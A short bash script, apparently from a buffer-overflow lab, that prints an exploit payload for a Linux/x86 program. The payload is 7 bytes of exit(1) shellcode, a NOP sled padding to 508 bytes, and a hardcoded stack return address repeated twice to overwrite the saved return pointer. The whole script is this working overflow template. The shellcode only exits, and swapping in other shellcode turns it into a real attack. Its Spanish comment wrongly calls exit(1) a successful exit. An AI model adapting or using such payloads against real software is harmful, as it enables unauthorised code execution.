#!/bin/bash

#Linux/x86 - exit(1)
#Ejecuta una salida exitosa
#7 bytes
echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80"

for i in $(seq 8 508)
do
	echo -ne "\x90"
done

for i in 1 2
do
	echo -ne "\x6c\xd4\xff\xff"
done
